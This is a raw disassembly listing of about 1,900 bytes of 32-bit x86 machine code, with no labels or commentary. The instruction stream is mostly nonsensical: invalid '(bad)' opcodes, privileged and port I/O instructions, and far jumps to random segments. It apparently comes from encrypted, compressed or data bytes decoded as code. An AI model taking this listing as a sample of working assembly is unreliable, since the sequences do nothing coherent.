  42108f:	pop    es
  421090:	pop    es
  421091:	fldln2 
  421093:	setp   BYTE PTR [eax-0x53]
  421097:	mov    WORD PTR [esi+0x5b],?
  42109a:	jns    0x42108e
  42109c:	inc    ebx
  42109d:	into   
  42109e:	fdiv   QWORD PTR [eax]
  4210a0:	in     al,dx
  4210a1:	and    eax,0xd6914eba
  4210a6:	ret    
  4210a7:	fmul   DWORD PTR [bp+di+0x54]
  4210ab:	cmc    
  4210ac:	add    al,0xa0
  4210ae:	inc    edi
  4210af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4210b0:	jecxz  0x421081
  4210b2:	stos   DWORD PTR es:[edi],eax
  4210b3:	and    al,0xc9
  4210b5:	aas    
  4210b6:	or     al,0x38
  4210b8:	sub    dh,BYTE PTR [edx]
  4210ba:	scas   al,BYTE PTR es:[edi]
  4210bb:	add    eax,0x983f9e9b
  4210c0:	pop    edi
  4210c1:	fnstcw WORD PTR [eax-0xa]
  4210c4:	mov    esp,0xda1024a6
  4210c9:	(bad)  
  4210ca:	xor    eax,0xdb2362c8
  4210cf:	jmp    0x2f9c:0x1b483e1a
  4210d6:	xlat   BYTE PTR ds:[ebx]
  4210d7:	inc    edx
  4210d8:	sbb    al,0x23
  4210da:	loope  0x42114f
  4210dc:	mov    cl,0xc9
  4210de:	pop    esi
  4210df:	arpl   WORD PTR [eax+edi*4],si
  4210e2:	add    al,0x99
  4210e4:	(bad)
  4210e7:	iret   
  4210e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4210e9:	ja     0x4210a2
  4210eb:	sbb    eax,0x9fb1c338
  4210f0:	outs   dx,BYTE PTR ds:[esi]
  4210f1:	ins    BYTE PTR es:[edi],dx
  4210f2:	aam    0x1c
  4210f4:	push   esi
  4210f5:	test   eax,0xc34d1b52
  4210fa:	pushf  
  4210fb:	mov    BYTE PTR [edx],ah
  4210fd:	icebp  
  4210fe:	fisubr WORD PTR [edi+0x749f620c]
  421104:	push   0xc895167a
  421109:	repnz lock pop esp
  42110c:	(bad)  
  42110d:	xchg   ebp,eax
  42110e:	pop    ds
  42110f:	push   ds
  421110:	push   esi
  421111:	inc    ecx
  421112:	jne    0x42118a
  421114:	inc    esi
  421115:	sub    ebp,DWORD PTR [edx+0x20]
  421118:	dec    edi
  421119:	pop    edx
  42111a:	push   edx
  42111b:	adc    al,0xbb
  42111d:	adc    DWORD PTR [esi+0x6c],esp
  421120:	in     eax,dx
  421121:	mov    edx,0xa3983050
  421126:	hlt    
  421127:	inc    edi
  421128:	scas   eax,DWORD PTR es:[edi]
  421129:	aad    0x49
  42112b:	dec    esp
  42112c:	jno    0x421158
  42112e:	mov    esi,DWORD PTR [eax-0x579579d9]
  421134:	pusha  
  421135:	fdiv   st(2),st
  421137:	or     al,0x68
  421139:	cmp    eax,0x93d05893
  42113e:	repnz mov eax,ds:0xa1b37130
  421144:	sbb    esi,eax
  421146:	fstp   DWORD PTR [eax]
  421148:	push   esp
  421149:	xor    DWORD PTR [esp+edx*2+0x70],eax
  42114d:	pop    ss
  42114e:	add    DWORD PTR [esi-0x9ea895a],esp
  421154:	push   ecx
  421155:	mov    bh,0xbb
  421157:	fsub   DWORD PTR [edx]
  421159:	pop    ecx
  42115a:	ror    bh,cl
  42115c:	lea    ecx,[ebx+0xe3c71c9]
  421162:	das    
  421163:	xchg   ebx,eax
  421164:	fimul  DWORD PTR [ebx-0x60fc6d1f]
  42116a:	nop
  42116b:	jno    0x421154
  42116d:	and    bl,0x88
  421170:	sbb    ch,BYTE PTR [esi]
  421172:	js     0x4211ad
  421174:	repnz fwait
  421176:	call   0x709c8807
  42117b:	or     DWORD PTR [ecx+0x9d],ebx
  421181:	add    BYTE PTR [edi+0x5b2a13cf],al
  421187:	(bad)  
  421188:	mov    edi,0x5549c1ef
  42118d:	cmp    ah,ch
  42118f:	dec    esp
  421190:	mov    al,0x22
  421192:	mov    ebp,0xf400018b
  421197:	add    al,0x0
  421199:	add    BYTE PTR [esi],ch
  42119b:	in     al,dx
  42119c:	repz fstp QWORD PTR [eax]
  42119f:	inc    edi
  4211a0:	jns    0x421196
  4211a2:	test   BYTE PTR [eax+0x33e2465c],dh
  4211a8:	sbb    bl,BYTE PTR [ecx]
  4211aa:	inc    esp
  4211ab:	xchg   ebx,eax
  4211ac:	data16 sti 
  4211ae:	adc    DWORD PTR [esi+0x74fd5c60],ebp
  4211b4:	or     al,0xc7
  4211b6:	nop
  4211b7:	js     0x42116d
  4211b9:	loope  0x421177
  4211bb:	cli    
  4211bc:	arpl   WORD PTR [edx],dx
  4211be:	mov    edi,0x4c8f0590
  4211c3:	ss pop edx
  4211c5:	scas   al,BYTE PTR es:[edi]
  4211c6:	sti    
  4211c7:	jnp    0x42115c
  4211c9:	fwait
  4211ca:	xor    BYTE PTR [edi-0x749f6d82],dh
  4211d0:	lock mov dl,0xc3
  4211d3:	into   
  4211d4:	cmp    DWORD PTR [edi+0x1690a320],edx
  4211da:	in     al,0x9a
  4211dc:	mov    gs,WORD PTR [edx+0x73]
  4211df:	sbb    dh,bh
  4211e1:	outs   dx,BYTE PTR ds:[esi]
  4211e2:	push   eax
  4211e3:	cmp    eax,0xe655ce62
  4211e8:	jae    0x421200
  4211ea:	mov    edx,0xd3729281
  4211ef:	xchg   DWORD PTR [edi],esp
  4211f1:	nop
  4211f2:	sub    al,0x95
  4211f4:	fs cmp eax,0xe4a9a447
  4211fa:	xchg   esp,eax
  4211fb:	xor    esp,ebp
  4211fd:	or     eax,0x20ca4f41
  421202:	pushf  
  421203:	in     eax,0xa6
  421205:	neg    edi
  421207:	mov    BYTE PTR [edx+0x1b],dl
  42120a:	pop    ebp
  42120b:	mov    bl,0x2b
  42120d:	hlt    
  42120e:	jp     0x421224
  421210:	int3   
  421211:	repz cmp ch,dl
  421214:	std    
  421215:	push   esp
  421216:	gs push esi
  421218:	adc    eax,0x6e106553
  42121d:	lds    eax,FWORD PTR [eax-0x15]
  421220:	mov    cl,0x68
  421222:	sbb    esi,edx
  421224:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421225:	xor    al,0xed
  421227:	xchg   DWORD PTR [eax+0x64],eax
  42122a:	cmp    ecx,DWORD PTR [esi+eiz*1+0x0]
  42122e:	adc    ebp,DWORD PTR [ebx]
  421230:	dec    edx
  421231:	adc    eax,0xc503153c
  421236:	cmp    eax,0xef725e
  42123b:	and    BYTE PTR [esi],dl
  42123d:	stos   DWORD PTR es:[edi],eax
  42123e:	push   esi
  42123f:	push   edi
  421240:	retf   0xaa87
  421243:	mov    ?,esi
  421245:	xor    BYTE PTR [ecx+0x6b],0xe7
  421249:	or     eax,DWORD PTR [esi-0x14]
  42124c:	sti    
  42124d:	or     BYTE PTR [ecx+0x306566f7],ch
  421253:	jns    0x42122e
  421255:	push   ebx
  421256:	add    BYTE PTR [ebx+0x1983270],ch
  42125c:	leave  
  42125d:	das    
  42125e:	jp     0x421219
  421260:	pop    eax
  421261:	sub    BYTE PTR [edx],0xf
  421264:	mov    al,0x74
  421266:	and    al,0xd2
  421268:	xor    BYTE PTR [ebp+0x6f],al
  42126b:	and    eax,0x4f607082
  421270:	or     eax,0xe2644c18
  421275:	dec    esi
  421276:	xor    DWORD PTR [edx],0xda0cd68
  42127c:	scas   eax,DWORD PTR es:[edi]
  42127d:	inc    esp
  42127e:	jns    0x421262
  421280:	xchg   edi,eax
  421281:	inc    eax
  421282:	std    
  421283:	(bad)  
  421284:	rcr    BYTE PTR [ebx-0x1644810e],1
  42128a:	or     BYTE PTR [ecx-0x5ecfa9c1],cl
  421290:	jle    0x4212d3
  421292:	push   ds
  421293:	push   ss
  421294:	mov    edx,0xfe868fde
  421299:	fiadd  WORD PTR [eax]
  42129b:	jb     0x421247
  42129d:	push   di
  42129f:	sbb    ch,BYTE PTR fs:[esi]
  4212a2:	pop    ebp
  4212a3:	mov    al,ds:0x50b6939c
  4212a8:	dec    ebx
  4212a9:	xlat   BYTE PTR ds:[ebx]
  4212aa:	mov    bl,0xd
  4212ac:	out    0xef,eax
  4212ae:	mov    ?,WORD PTR [edx+eax*2-0x32]
  4212b2:	and    esp,ebx
  4212b4:	ror    DWORD PTR [eax-0x42],cl
  4212b7:	mov    eax,0x728dee7d
  4212bc:	mov    dl,0x8f
  4212be:	retf   0x2f1d
  4212c1:	push   0xa6f797ea
  4212c6:	jmp    0x4212d0
  4212c8:	and    BYTE PTR [edi+0x69],dl
  4212cb:	mov    edi,edx
  4212cd:	fsubr  st,st(2)
  4212cf:	int    0xe0
  4212d1:	and    al,BYTE PTR [edi+0x1d9b7c06]
  4212d7:	jae    0x421264
  4212d9:	inc    eax
  4212da:	and    ecx,ebp
  4212dc:	in     al,dx
  4212dd:	pusha  
  4212de:	xchg   ebp,eax
  4212df:	and    esi,ebp
  4212e1:	imul   ebx,DWORD PTR [ebx+0xce05fc0],0xffffff8d
  4212e8:	cmp    al,0x8f
  4212ea:	cs jmp 0x93a7:0x5b553d99
  4212f2:	(bad)  
  4212f3:	xchg   ebx,eax
  4212f4:	das    
  4212f5:	(bad)  
  4212f6:	loopne 0x421301
  4212f8:	stc    
  4212f9:	pop    eax
  4212fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212fb:	mov    dl,BYTE PTR [ebx]
  4212fd:	rol    DWORD PTR [eax-0x26],cl
  421300:	and    ecx,esi
  421302:	das    
  421303:	sbb    dl,cl
  421305:	xlat   BYTE PTR ds:[ebx]
  421306:	scas   al,BYTE PTR es:[edi]
  421307:	mov    esp,0xc82f59a
  42130c:	inc    ebx
  42130d:	fst    QWORD PTR [esi-0x79]
  421310:	sub    esi,DWORD PTR [ecx]
  421312:	ja     0x4212c2
  421314:	fimul  WORD PTR [edx]
  421316:	jecxz  0x421373
  421318:	aam    0x39
  42131a:	or     esi,edx
  42131c:	jecxz  0x42136e
  42131e:	in     eax,0xf7
  421320:	sub    dl,bl
  421322:	inc    edx
  421323:	or     edx,DWORD PTR [ebp+0x40]
  421326:	aad    0xda
  421328:	ror    esp,0xb0
  42132b:	in     al,dx
  42132c:	cmp    eax,0x219efbf4
  421331:	loope  0x421393
  421333:	inc    esp
  421334:	xor    DWORD PTR [edi+0x1f],0x12
  421338:	sbb    DWORD PTR [ebx+0x59b6c235],0xffffffa7
  42133f:	shr    DWORD PTR [ebx+0x43],1
  421342:	stos   BYTE PTR es:[edi],al
  421343:	aaa    
  421344:	xor    eax,0x2d899f2b
  421349:	in     eax,0x1b
  42134b:	dec    esp
  42134c:	hlt    
  42134d:	jecxz  0x4213c8
  42134f:	adc    esp,DWORD PTR [edi+0x1f]
  421352:	dec    edi
  421353:	rol    DWORD PTR [ebp-0x38],0xf2
  421357:	call   0xbdc766e1
  42135c:	and    ebp,0x3d
  42135f:	call   esi
  421361:	sbb    DWORD PTR [esi+0x20],ebx
  421364:	stos   DWORD PTR es:[edi],eax
  421365:	(bad)  
  421366:	mov    esp,0x4c29ed96
  42136b:	(bad)  
  42136c:	in     al,dx
  42136d:	fnstsw WORD PTR ds:0x2c39a095
  421373:	cmove  ecx,DWORD PTR [esi-0x3e]
  421377:	pop    eax
  421378:	sub    al,0x38
  42137a:	loop   0x42131d
  42137c:	sbb    eax,0xc466af1
  421381:	adc    al,BYTE PTR [ebp-0x585e395d]
  421387:	xchg   ebx,eax
  421388:	fnstsw WORD PTR [ecx-0x15ab629a]
  42138e:	sahf   
  42138f:	(bad)  
  421391:	xor    al,0x40
  421393:	cmp    BYTE PTR [esi+0x4f2242e2],0x86
  42139a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42139b:	mov    al,0xaf
  42139d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42139e:	repnz mov bh,0x70
  4213a1:	xlat   BYTE PTR ds:[ebx]
  4213a2:	jno    0x421339
  4213a4:	push   ebp
  4213a5:	(bad)  
  4213a6:	fcmovnb st,st(1)
  4213a8:	out    0x27,eax
  4213aa:	retf   
  4213ab:	jo     0x42136c
  4213ad:	aaa    
  4213ae:	icebp  
  4213af:	outs   dx,DWORD PTR ds:[esi]
  4213b0:	add    al,0x94
  4213b3:	dec    ebx
  4213b4:	ret    
  4213b5:	pop    es
  4213b6:	cld    
  4213b7:	outs   dx,DWORD PTR ds:[esi]
  4213b8:	push   ebx
  4213b9:	add    edi,edx
  4213bb:	lods   al,BYTE PTR ds:[esi]
  4213bc:	loop   0x4213b9
  4213be:	xor    edx,ebx
  4213c0:	sbb    al,0x76
  4213c2:	in     al,0xae
  4213c4:	ss mov edx,0x84b20544
  4213ca:	dec    esp
  4213cb:	mov    esp,0x831e826f
  4213d0:	int3   
  4213d1:	nop
  4213d2:	adc    esi,DWORD PTR [esi]
  4213d4:	dec    eax
  4213d5:	out    dx,al
  4213d6:	push   edi
  4213d7:	and    al,0x22
  4213d9:	inc    eax
  4213da:	mov    dl,0xbc
  4213dc:	mov    ds,WORD PTR [edx]
  4213de:	dec    ecx
  4213df:	push   0xa220bc4f
  4213e4:	popf   
  4213e5:	fwait
  4213e6:	jnp    0x421417
  4213e8:	pushf  
  4213e9:	enter  0x3818,0x17
  4213ed:	inc    eax
  4213ee:	mov    ecx,0x32075257
  4213f3:	sub    BYTE PTR [ebx+0x1cc71d9a],dl
  4213f9:	push   0x16
  4213fb:	stos   DWORD PTR es:[edi],eax
  4213fc:	jne    0x421443
  4213fe:	jmp    0x3258:0x1e14ee14
  421405:	dec    edi
  421406:	call   0x91a4:0xf6a71d1d
  42140d:	jae    0x421418
  42140f:	push   cs
  421410:	adc    al,0xf4
  421412:	pop    es
  421413:	xchg   ebp,eax
  421414:	ins    BYTE PTR es:[edi],dx
  421415:	aas    
  421416:	test   eax,0x36cd7ebc
  42141b:	cwde   
  42141c:	aaa    
  42141d:	or     BYTE PTR [ecx],ah
  42141f:	push   esp
  421420:	and    dh,BYTE PTR [ebp-0x79]
  421423:	outs   dx,BYTE PTR ds:[esi]
  421424:	fcmove st,st(4)
  421426:	sub    al,0xd7
  421428:	nop
  421429:	mov    ds:0x152712e8,eax
  42142e:	call   0x5c86:0x47300c21
  421435:	cld    
  421436:	xchg   edi,eax
  421437:	jae    0x42142b
  421439:	jecxz  0x4214a5
  42143b:	dec    esp
  42143c:	mov    cl,0x55
  42143e:	dec    esi
  42143f:	aam    0xa0
  421441:	data16 test dl,cl
  421444:	cmp    eax,0x2b891539
  421449:	and    al,0x55
  42144b:	int    0x9d
  42144d:	fpatan 
  42144f:	ret    0xf2b3
  421452:	add    esp,ecx
  421454:	cdq    
  421455:	and    eax,0x1038740a
  42145a:	dec    esi
  42145b:	xor    al,0xb9
  42145d:	je     0x421494
  42145f:	mov    DWORD PTR [edx],esi
  421461:	mov    DWORD PTR [edx+0x70],ebx
  421464:	pop    esp
  421465:	stc    
  421466:	mov    BYTE PTR [ecx+0x6a],dl
  421469:	ins    DWORD PTR es:[edi],dx
  42146a:	cmp    DWORD PTR [esi],esp
  42146c:	cli    
  42146d:	in     al,0x49
  42146f:	popf   
  421470:	test   BYTE PTR [edx+0x16],0x4
  421474:	xchg   BYTE PTR [edx],bl
  421476:	in     al,dx
  421477:	jl     0x421410
  421479:	std    
  42147a:	mov    edi,0x7a03befa
  42147f:	test   cl,ch
  421481:	or     al,0x89
  421483:	mov    ecx,0xb2d1ffdb
  421488:	out    dx,eax
  421489:	les    esp,FWORD PTR [esi]
  42148b:	stos   DWORD PTR es:[edi],eax
  42148c:	pusha  
  42148d:	int    0x67
  42148f:	jmp    0x4214b7
  421491:	xlat   BYTE PTR ds:[ebx]
  421492:	ss push ebp
  421494:	xchg   DWORD PTR [ebp+0x263e4ad6],esi
  42149a:	lods   al,BYTE PTR ds:[esi]
  42149b:	pop    esp
  42149c:	test   eax,0xf633e6ab
  4214a1:	inc    esp
  4214a2:	rcr    BYTE PTR [ecx+0x4c82b7fe],0xda
  4214a9:	adc    eax,0xd25bda3d
  4214ae:	ins    BYTE PTR es:[edi],dx
  4214af:	mov    cl,0x17
  4214b1:	out    dx,al
  4214b2:	cmp    al,0x2
  4214b4:	data16 loope 0x421509
  4214b7:	xchg   esi,eax
  4214b8:	fld    TBYTE PTR [esi+eax*8]
  4214bb:	mov    cl,bl
  4214bd:	mov    ecx,0xaeb906df
  4214c2:	sub    BYTE PTR [ecx+0x4306488e],bl
  4214c8:	cmp    eax,DWORD PTR [edx-0x37677831]
  4214ce:	adc    DWORD PTR [esi-0x7c],ebp
  4214d1:	or     eax,0x7a3b61aa
  4214d6:	jbe    0x421512
  4214d8:	call   0x33a949b5
  4214dd:	inc    eax
  4214de:	lea    ebp,[edx]
  4214e0:	popf   
  4214e1:	and    ah,BYTE PTR [edi-0x769b456e]
  4214e7:	pop    esp
  4214e8:	add    esp,DWORD PTR [edi+0x1f]
  4214eb:	inc    esi
  4214ec:	fcomi  st,st(5)
  4214ee:	pop    ss
  4214ef:	fwait
  4214f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4214f1:	sbb    ah,BYTE PTR [edx+eax*1]
  4214f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4214f5:	into   
  4214f6:	dec    ecx
  4214f7:	aaa    
  4214f8:	sub    al,0xeb
  4214fa:	aad    0x8f
  4214fc:	inc    esi
  4214fd:	and    DWORD PTR [ebp-0x66],edi
  421500:	data16 ins BYTE PTR es:[edi],dx
  421502:	ja     0x4214b0
  421504:	push   ebp
  421505:	dec    edx
  421506:	fiadd  WORD PTR [ecx+esi*1+0x490aafe6]
  42150d:	jmp    0xdbfd:0x5149ee20
  421514:	xor    edx,edi
  421516:	js     0x4214e9
  421518:	cmp    al,0xc1
  42151a:	mov    ah,0xef
  42151c:	das    
  42151d:	fsub   QWORD PTR [esi]
  42151f:	imul   edx,DWORD PTR [edx+0x6],0x648639f3
  421526:	sub    DWORD PTR [ebp+0x1],eax
  421529:	push   ecx
  42152a:	push   0x28b57a20
  42152f:	stos   DWORD PTR es:[edi],eax
  421530:	push   ebx
  421531:	push   ds
  421532:	dec    ecx
  421533:	rcl    BYTE PTR [edx],cl
  421535:	loop   0x42150d
  421537:	inc    ebp
  421538:	mov    ds:0xd43cedaa,al
  42153d:	jno    0x421555
  42153f:	jns    0x421544
  421541:	mov    bl,0xe7
  421543:	int3   
  421544:	(bad)  
  421545:	ins    BYTE PTR es:[edi],dx
  421546:	mov    edi,0x591cf47c
  42154b:	adc    DWORD PTR [ebp+0x77292df6],0xffffffe9
  421552:	inc    edx
  421553:	mov    DWORD PTR [edi],esi
  421555:	push   ebx
  421556:	add    al,0x48
  421558:	lahf   
  421559:	sbb    al,0xf6
  42155b:	retf   
  42155c:	(bad)  
  42155e:	jne    0x421511
  421560:	loopne 0x4214f6
  421562:	imul   ebx,DWORD PTR [ebx],0x52f724df
  421568:	leave  
  421569:	(bad)  
  42156a:	leave  
  42156b:	mov    edx,0x66bc7a73
  421570:	retf   0xfe80
  421573:	mov    al,ds:0x62e1e654
  421578:	inc    esp
  421579:	loop   0x4215b1
  42157b:	aam    0xe6
  42157d:	or     bh,BYTE PTR [edx-0x5f]
  421580:	jnp    0x421527
  421582:	fstp   st(6)
  421584:	add    eax,0x77cf5e0
  421589:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42158a:	and    ch,al
  42158c:	jmp    0x421549
  42158e:	loope  0x421548
  421590:	sub    esp,esi
  421592:	pop    ebp
  421593:	push   edx
  421594:	test   eax,0xcb725e2e
  421599:	mul    DWORD PTR [ecx]
  42159b:	es clc 
  42159d:	scas   al,BYTE PTR es:[edi]
  42159e:	dec    BYTE PTR [eax+eiz*4+0x1e]
  4215a2:	mov    ah,0x14
  4215a4:	hlt    
  4215a5:	iret   
  4215a6:	and    DWORD PTR [edi],0xffffffe9
  4215a9:	cmp    DWORD PTR [esi-0x1e4f3cb2],esi
  4215af:	and    al,BYTE PTR [ebx-0x4f]
  4215b2:	push   ds
  4215b3:	stos   BYTE PTR es:[edi],al
  4215b4:	cld    
  4215b5:	clc    
  4215b6:	cmp    BYTE PTR [esi-0x43],0x1d
  4215ba:	mov    al,0x55
  4215bc:	inc    edx
  4215bd:	ins    BYTE PTR es:[edi],dx
  4215be:	fmul   DWORD PTR ds:0xfc8baaa
  4215c4:	sbb    eax,0x3d513263
  4215c9:	mov    esi,ebp
  4215cb:	cmp    bl,BYTE PTR [eax]
  4215cd:	adc    esi,edx
  4215cf:	xor    edx,eax
  4215d1:	or     al,0x71
  4215d3:	scas   eax,DWORD PTR es:[edi]
  4215d4:	cmc    
  4215d5:	cli    
  4215d6:	and    DWORD PTR [di+0x70aa],esi
  4215db:	sbb    BYTE PTR [edi],bh
  4215dd:	(bad)  
  4215de:	lock repnz push 0xa5c08c59
  4215e5:	out    0x26,al
  4215e7:	inc    esi
  4215e8:	leave  
  4215e9:	mul    BYTE PTR [eax+0x2d]
  4215ec:	pop    es
  4215ed:	(bad)  [eax]
  4215ef:	(bad)  
  4215f1:	sbb    al,BYTE PTR [edx-0x16]
  4215f4:	dec    eax
  4215f5:	clc    
  4215f6:	dec    esp
  4215f7:	inc    edx
  4215f8:	pop    esi
  4215f9:	jae    0x4215c7
  4215fb:	test   eax,0xe1f6a6c9
  421600:	push   es
  421601:	jb     0x4215e0
  421603:	rcr    dh,cl
  421605:	sub    dh,BYTE PTR [ebp+0x3e]
  421608:	cdq    
  421609:	mov    ch,0x76
  42160b:	xchg   ecx,eax
  42160c:	mov    BYTE PTR [edi],dl
  42160e:	gs dec eax
  421610:	jo     0x421595
  421612:	mov    WORD PTR [edi+0x5],cs
  421615:	push   cs
  421616:	sub    cl,0x9b
  421619:	(bad)  
  42161a:	shl    edi,0x3c
  42161d:	xchg   BYTE PTR [ebx],cl
  42161f:	mov    ebp,0x2d27adce
  421624:	aas    
  421625:	sub    eax,0xe3a66ba8
  42162a:	stos   BYTE PTR es:[edi],al
  42162b:	not    BYTE PTR [ebp-0x5b4040f]
  421631:	fs dec eax
  421633:	fsubr  st(7),st
  421635:	out    0x3e,al
  421637:	lahf   
  421638:	lods   eax,DWORD PTR ds:[esi]
  421639:	push   cs
  42163a:	lods   eax,DWORD PTR ds:[esi]
  42163b:	iret   
  42163c:	xor    al,0x43
  42163e:	sbb    DWORD PTR [ebx-0x6b],edx
  421641:	out    0xbd,eax
  421643:	or     cl,BYTE PTR [ecx+0x6d]
  421646:	push   cs
  421647:	xchg   esp,eax
  421648:	push   cs
  421649:	pusha  
  42164a:	pop    ebp
  42164b:	mov    bl,0x22
  42164d:	mov    eax,0xfe1d9baa
  421652:	(bad)  [ebx]
  421654:	call   FWORD PTR [esi+ebx*1-0x1a13c3e0]
  42165b:	aad    0x9c
  42165d:	test   eax,0x311f2480
  421662:	fld    st(3)
  421664:	ins    DWORD PTR es:[edi],dx
  421665:	rcr    BYTE PTR [ebx+0x79],cl
  421668:	mov    ebp,0x948c51a6
  42166d:	jnp    0x42166a
  42166f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421670:	icebp  
  421671:	fwait
  421672:	int3   
  421673:	mov    ebp,0xfffccf9f
  421678:	pop    es
  421679:	xor    ebx,ebp
  42167b:	mov    BYTE PTR [ebx+0x3e12a805],dl
  421681:	jbe    0x4216e7
  421683:	mov    esp,0xf35cb00e
  421688:	dec    edi
  421689:	lods   al,BYTE PTR ds:[esi]
  42168a:	add    al,ch
  42168c:	bound  ecx,QWORD PTR [ebx]
  42168e:	add    BYTE PTR [eax],al
  421690:	add    BYTE PTR [eax],al
  421692:	sti    
  421693:	and    al,0xdc
  421695:	es (bad) 
  421698:	sti    
  421699:	std    
  42169a:	sbb    ch,BYTE PTR [edx]
  42169c:	adc    eax,0x7a60d2c6
  4216a1:	xchg   ebp,eax
  4216a2:	mov    cl,0x90
  4216a4:	add    DWORD PTR [eax],eax
  4216a6:	hlt    
  4216a7:	add    al,0x0
  4216a9:	add    BYTE PTR [ecx-0x49773c91],bl
  4216af:	push   ebp
  4216b0:	mov    ebp,0x7f11e0f4
  4216b5:	ret    0x7f4b
  4216b8:	das    
  4216b9:	add    al,0x2d
  4216bb:	hlt    
  4216bc:	pop    ss
  4216bd:	xchg   edx,eax
  4216be:	mov    dh,0x29
  4216c0:	cld    
  4216c1:	mov    ds:0x73c5efd8,al
  4216c6:	and    ch,BYTE PTR [esi]
  4216c8:	and    eax,0x84c7000f
  4216cd:	imul   eax,edx,0x41
  4216d0:	adc    DWORD PTR [esi],0xea2d95dc
  4216d6:	mov    edi,0xf519a1ec
  4216db:	mov    esi,0x9f60f5ad
  4216e0:	(bad)  
  4216e2:	shl    edx,cl
  4216e4:	push   ds
  4216e5:	test   BYTE PTR [ebx+0x6c],ah
  4216e8:	cwde   
  4216e9:	test   BYTE PTR [edx+0x29574cf],cl
  4216ef:	jbe    0x4216ab
  4216f1:	in     al,0x80
  4216f3:	retf   0xfc72
  4216f6:	inc    edi
  4216f7:	xchg   DWORD PTR [ebp+0x45],eax
  4216fa:	inc    ebx
  4216fb:	sbb    eax,0xe13d6c92
  421700:	jo     0x42169c
  421702:	jge    0x421743
  421704:	dec    ebx
  421705:	fmulp  st(4),st
  421707:	push   es
  421708:	sbb    eax,0x36e5eeaf
  42170d:	aaa    
  42170e:	mov    ds,WORD PTR [esi+0x13]
  421711:	mov    eax,ds
  421713:	into   
  421714:	adc    DWORD PTR [ebp+0x646d663],edi
  42171a:	push   esp
  42171b:	retf   0x885
  42171e:	jle    0x4216d7
  421720:	xchg   ecx,eax
  421721:	push   eax
  421722:	push   ds
  421723:	or     edx,DWORD PTR [ecx+0x65]
  421726:	or     esp,eax
  421728:	int    0xfe
  42172a:	in     eax,dx
  42172b:	test   eax,edx
  42172d:	pop    ecx
  42172e:	repnz inc esp
  421730:	cmp    ebp,DWORD PTR [eax+eiz*1+0x1a]
  421734:	retf   0xe0db
  421737:	shl    cl,0x86
  42173a:	dec    ecx
  42173b:	in     al,dx
  42173c:	leave  
  42173d:	xchg   edi,eax
  42173e:	loope  0x4216f1
  421740:	dec    esi
  421741:	gs stos BYTE PTR es:[edi],al
  421743:	rcl    DWORD PTR [esi+0x91a6084],0xa2
  42174a:	xchg   esi,eax
  42174b:	jb     0x4216d1
  42174d:	add    BYTE PTR [eax-0x35d96992],dl
  421753:	lods   eax,DWORD PTR ds:[esi]
  421754:	add    ah,BYTE PTR [ecx+0x4b]
  421757:	add    BYTE PTR [edx-0xbd82f2],al
  42175d:	jecxz  0x421755
  42175f:	gs sbb ebx,edi
  421762:	shl    BYTE PTR [esi+esi*2-0x34],cl
  421766:	xor    al,0x76
  421768:	pop    eax
  421769:	mov    ch,0x5f
  42176b:	push   edi
  42176c:	mov    ch,0xd2
  42176e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42176f:	sbb    BYTE PTR [eax+eax*8+0x5b],0xfe
  421774:	outs   dx,BYTE PTR ds:[esi]
  421775:	les    ebx,FWORD PTR [esi+ebx*8]
  421778:	imul   eax,DWORD PTR [eax+0x2797288f],0x79
  42177f:	or     eax,0xbeed229c
  421784:	fnstsw WORD PTR [ebx-0x45]
  421787:	adc    al,0x51
  421789:	mov    DWORD PTR [ebp+0x74],esi
  42178c:	(bad)  [ecx+edi*1+0x51]
  421790:	shl    BYTE PTR [edi-0x6],1
  421793:	test   eax,0x8f9aae33
  421798:	scas   eax,DWORD PTR es:[edi]
  421799:	scas   al,BYTE PTR es:[edi]
  42179a:	mov    al,ds:0x1de43a45
  42179f:	in     eax,0x97
  4217a1:	stos   DWORD PTR es:[edi],eax
  4217a2:	or     esi,DWORD PTR [eax+0x61]
  4217a5:	cmp    bh,0x94
  4217a8:	(bad)  
  4217aa:	inc    ebp
  4217ab:	add    al,0x90
  4217ad:	and    esi,DWORD PTR [esp+eiz*2]
  4217b0:	ins    BYTE PTR es:[edi],dx
  4217b1:	outs   dx,BYTE PTR ds:[esi]
  4217b2:	gs xchg ecx,eax
  4217b4:	dec    ebx
  4217b5:	adc    dh,BYTE PTR [edi]
  4217b7:	fwait
  4217b8:	push   edx
  4217b9:	aas    
  4217ba:	dec    edx
  4217bb:	push   ebx
  4217bc:	lods   eax,DWORD PTR ds:[esi]
  4217bd:	pusha  
  4217be:	mov    dh,al
  4217c0:	retf   0x524
  4217c3:	adc    edx,DWORD PTR [edi+0x25]
  4217c6:	mov    ds:0x8b23e0c4,al
  4217cb:	loop   0x4217aa
  4217cd:	inc    ebx
  4217ce:	pop    ss
  4217cf:	push   es
  4217d0:	push   ebx
  4217d1:	into   
  4217d2:	dec    ecx
  4217d3:	and    BYTE PTR [ebx+edx*8+0x66f010f1],al
  4217da:	stos   BYTE PTR es:[edi],al
  4217db:	test   WORD PTR [esi-0x80],ax
  4217df:	mov    edx,0xa718511
  4217e4:	jno    0x421849
  4217e6:	ja     0x42179e
  4217e8:	jbe    0x4217ef
  4217ea:	jae    0x421801
  4217ec:	mov    edx,0x848d7ee5
  4217f1:	pop    eax
  4217f2:	adc    eax,DWORD PTR [eax-0x4ec42929]
  4217f8:	mov    edx,0xceccc15b
  4217fd:	js     0x42187d
  4217ff:	xchg   esi,eax
  421800:	dec    ebx
  421801:	mov    bl,0xd7
  421803:	les    ebx,FWORD PTR [eax+0x7c714086]
  421809:	cwde   
  42180a:	mov    ds,edi
  42180c:	ds loope 0x4217ca
  42180f:	pcmpgtw mm7,QWORD PTR [ebp+0x7e]
  421813:	lods   al,BYTE PTR ds:[esi]
  421814:	call   0x850098ae
  421819:	cwde   
  42181a:	jmp    FWORD PTR [edi+0x375ea5fd]
  421820:	popf   
  421821:	pusha  
  421822:	repnz (bad) 
  421824:	sbb    BYTE PTR [ebx],bl
  421826:	repnz inc bp
  421829:	mov    dh,0x41
